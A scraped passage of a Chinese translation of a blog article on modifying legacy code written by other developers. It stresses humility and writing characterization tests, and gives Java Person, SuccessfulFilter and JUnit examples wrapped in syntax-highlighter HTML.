href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/techzi\">followflows</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/techzi\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/avatars/12376/f253b9339926315b78b84e6eea1fcec0-bpfull.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            followflows        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/techzi\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/techzi/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/techzi/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 12</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_img_path": "full/677e16388d72aba17372c375d07615d374d00847.jpg"}
{"url_object_id": "feca1912a4a2171c56a8aa2694d80c5e", "title": "如何处理前任程序员留下的代码", "url": "http://blog.jobbole.com/113130/", "create_date": "2017/11/28", "front_img_url": ["http://jbcdn2.b0.upaiyun.com/2017/01/d8ff4fd532a1a30d821049d62c62d106.jpg"], "praise_nums": 1, "comment_nums": 2, "favor_nums": 3, "tags": "开发,代码,测试", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://dzone.com/articles/adding-functionality-to-legacy-code\">Justin Albano</a>   译文出处：<a target=\"_blank\" href=\"https://www.oschina.net/translate/adding-functionality-to-legacy-code\">开源中国</a>   </div><p>身为一个软件工程师，我们不可避免的会遇到这样一些问题：不得不修改别人的代码，或者在别人的代码中添加新的功能。我们并不熟悉这些代码，它也可能在整个系统中与我们编写的部分无关。虽然这样的工作很困难，容易让人感到无奈，但是要达到足够的灵活性来也别的开发者一起编写代码，收获也蛮大的。这些收获包括提高影响力，修复烂软件，还能学到系统中以前并不了解的部分（还可以从其它程序员那里学到技术和技巧）。</p>\n<p>在其它开发者的代码中工作时，既会感到郁闷，又会从中有益，考虑到这些因素，我们必须警惕一些极其容易出错的地方：</p>\n<ul>\n<li><strong>我们的自我意识</strong>：我们可能会认为自己最有能耐，但通常都不是。我们对要改变的代码知之甚少，不了解原作者的意图，也不了解多少年有哪些因素导致这些代码形成，以及作者在编写这些代码的时候使用了什么样的工具和框架。谦卑价值万金，我们应该时刻保持这种心态。</li>\n<li><strong>原作者的自我意识</strong>：我们要接触的代码来自另一个开发者，他/她有自己的网络、约束、最后期限等，当然也有他/她自己的生活（这会占用一点工作时间）。他/她也是一个人，当我们质疑他/她做出的决定，或者质问为什么代码这么糟糕的时候，他/她会自然地产生防御性心理。我们应该努力让原作者与我们合作，而不是成为我们工作的<strong>阻碍</strong>。</li>\n<li><strong>恐惧未知事物</strong>：我们很多时候会接触到只了解一点点甚至完全不了解的代码。这似乎是件可怕的事情：我们得对自己做出的改动负责，但我们就像是在一个没有光亮的黑屋子里走来走去。我们不需要害怕，而是应该建立起一个框架，可以在里面安心地进行大大小小的修改，同时确保我们不会破坏现有的功能。</li>\n</ul>\n<p>所有开发人员，包括我们自己，都是人。因此在别人编写的代码上工作，会受到人性的影响。在本文中，我们会讲述五种方法，利用人性的优点，从现有代码和原作者身上取得尽可能多的收获，并改善代码既有的状态。虽然这个清单并不全面，但应用这些方法将确保我们在完成对别人代码的修改工作后，会有信心保持现有功能的工作状态，同时又能保证新功能融合在现有代码中。</p>\n<h2>1. 确保有测试</h2>\n<p>对于别的开发人员写出来的功能，它确实如预期一样工作吗？我们所做的修改是否会妨碍它按照预期工作？对此，唯一能让人产生信心完成前述问题的方式就是，用测试来支持代码。我们在阅读别人的代码时，会发现两种可能的状态：(1) 没有达到足够水平的测试，或者 (2) 有达到足够水平的测试。对于前者，我们会陷入创建测试的困境；而对于后者，我们可以使用现有的测试来确保我们所做的修改不会破解原来的代码，同时也能从测试中大量地了解到代码的意图。</p>\n<h3>创建新测试</h3>\n<p>这听起来可能很惨：我们在更改另一个开发人员的代码时，要对我们的行为负责，但我们无法保证更改是否会造成破坏。<strong>吐槽是没有用的</strong>。不管我们发现代码是什么状态，只要动了代码，就得对其负责。因此，我们应该在修改代码的时候控制自己的行为。如果不想造成破坏，那就自己写测试。</p>\n<p>这很枯燥，但我们可以通过编写测试来了解代码，这也是它的主要优点。假如现在的代码工作良好，我们需要编写测试，使其在获得预期输入的情况下产生预期的输出。在写测试的过程中，我们会逐渐了解代码的意图和功能。比如，存在如下代码</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b21f512839246\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class Person {\r\n\r\n    private int age;\r\n    private double salary;\r\n\r\n    public Person(int age, double salary) {\r\n        this.age = age;\r\n        this.salary = salary;\r\n    }\r\n\r\n    public void setAge(int age) {\r\n        this.age = age;\r\n    }\r\n\r\n    public int getAge() {\r\n        return age;\r\n    }\r\n\r\n    public void setSalary(double salary) {\r\n        this.salary = salary;\r\n    }\r\n\r\n    public double getSalary() {\r\n        return salary;\r\n    }\r\n}\r\n\r\npublic class SuccessfulFilter implements Predicate&lt;Person&gt; {\r\n\r\n    &lt;a href='http://www.jobbole.com/members/wx610506454'&gt;@Override&lt;/a&gt;\r\n    public boolean test(Person person) {\r\n        return person.getAge() &lt; 30 &amp;&amp; \r\n            ((((person.getSalary() - (250 * 12)) - 1500) * 0.94) &gt; 60000);\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b21f512839246-34\">34</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b21f512839246-35\">35</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-1\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">Person</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-3\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-4\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-6\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-7\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-8\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-9\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-11\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">int</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-12\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">age</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-13\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-14\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-15\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">int</span> <span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-16\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">age</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-17\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-18\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-19\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">setSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">double</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-20\">        <span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">salary</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-21\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-22\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-23\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-24\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">salary</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-25\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-26\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-27\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-28\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">SuccessfulFilter</span> <span class=\"crayon-r\">implements</span> <span class=\"crayon-e\">Predicate</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-e\">Person</span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-29\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-30\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/wx610506454'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Override</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-31\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">boolean</span> <span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">Person</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-32\">        <span class=\"crayon-st\">return</span> <span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getAge</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">30</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&amp;&amp;</span><span class=\"crayon-h\"> </span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-33\"><span class=\"crayon-h\">            </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getSalary</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">250</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">12</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1500</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0.94</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&gt;</span> <span class=\"crayon-cn\">60000</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b21f512839246-34\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b21f512839246-35\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0125 seconds] -->\r\n<p>我们对其功能和代码中使用的魔法数字[译者注：指直接的数字常量]并不了解，但我们可以创建一组测试，根据已知的输入产生已知的输出。比如，通过简单的数学运算分析成功人士的薪资。我们发现如果 30 岁以下的人每年挣大约 $68,330，就会被认为是成功的（按代码中的标准）。虽然我们不知道那些魔法数字是什么意思，但我们知道它们会减少原始薪资。这样，$68,330 这个阈值是扣除前的基本薪资。使用这些信息，我们可以创建一些简单的测试，如下：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a634cc71b22a614436758\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npublic class SuccessfulFilterTest {\r\n\r\n    private static final double THRESHOLD_NET_SALARY = 68330.0;\r\n\r\n    &lt;a href='http://www.jobbole.com/members/q1531454480'&gt;@Test&lt;/a&gt;\r\n    public void under30AndNettingThresholdEnsureSuccessful() {\r\n        Person person = new Person(29, THRESHOLD_NET_SALARY);\r\n        Assert.assertTrue(new SuccessfulFilter().test(person));\r\n    }\r\n\r\n    &lt;a href='http://www.jobbole.com/members/q1531454480'&gt;@Test&lt;/a&gt;\r\n    public void exactly30AndNettingThresholdEnsureUnsuccessful() {\r\n        Person person = new Person(30, THRESHOLD_NET_SALARY);\r\n        Assert.assertFalse(new SuccessfulFilter().test(person));\r\n    }\r\n\r\n    &lt;a href='http://www.jobbole.com/members/q1531454480'&gt;@Test&lt;/a&gt;\r\n    public void under30AndNettingLessThanThresholdEnsureSuccessful() {\r\n        Person person = new Person(29, THRESHOLD_NET_SALARY - 1);\r\n        Assert.assertFalse(new SuccessfulFilter().test(person));\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5a634cc71b22a614436758-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a634cc71b22a614436758-22\">22</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-1\"><span class=\"crayon-m\">public</span> <span class=\"crayon-t\">class</span> <span class=\"crayon-e\">SuccessfulFilterTest</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-2\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-3\">    <span class=\"crayon-m\">private</span> <span class=\"crayon-m\">static</span> <span class=\"crayon-m\">final</span> <span class=\"crayon-t\">double</span> <span class=\"crayon-v\">THRESHOLD_NET</span><span class=\"crayon-sy\">_</span>SALARY <span class=\"crayon-o\">=</span> <span class=\"crayon-cn\">68330.0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-4\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-5\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q1531454480'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Test</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-o\">/</span><span class=\"crayon-v\">a</span><span class=\"crayon-o\">&gt;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-6\">    <span class=\"crayon-m\">public</span> <span class=\"crayon-t\">void</span> <span class=\"crayon-e\">under30AndNettingThresholdEnsureSuccessful</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span> <span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-7\">        <span class=\"crayon-i\">Person</span> <span class=\"crayon-i\">person</span> <span class=\"crayon-o\">=</span> <span class=\"crayon-r\">new</span> <span class=\"crayon-e\">Person</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">29</span><span class=\"crayon-sy\">,</span> <span class=\"crayon-v\">THRESHOLD_NET_SALARY</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-8\">        <span class=\"crayon-st\">Assert</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">assertTrue</span><span class=\"crayon-sy\">(</span><span class=\"crayon-r\">new</span> <span class=\"crayon-e\">SuccessfulFilter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">test</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">person</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-9\">    <span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a634cc71b22a614436758-10\"> </div><div class=\"crayon-line\" id=\"crayon-5a634cc71b22a614436758-11\">    <span class=\"crayon-o\">&lt;</span><span class=\"crayon-i\">a</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">href</span><span class=\"crayon-o\">=</span><span class=\"crayon-s\">'http://www.jobbole.com/members/q1531454480'</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-sy\">@</span><span class=\"crayon-v\">Test</span><span class=\"crayon-o\">&lt;</span><span 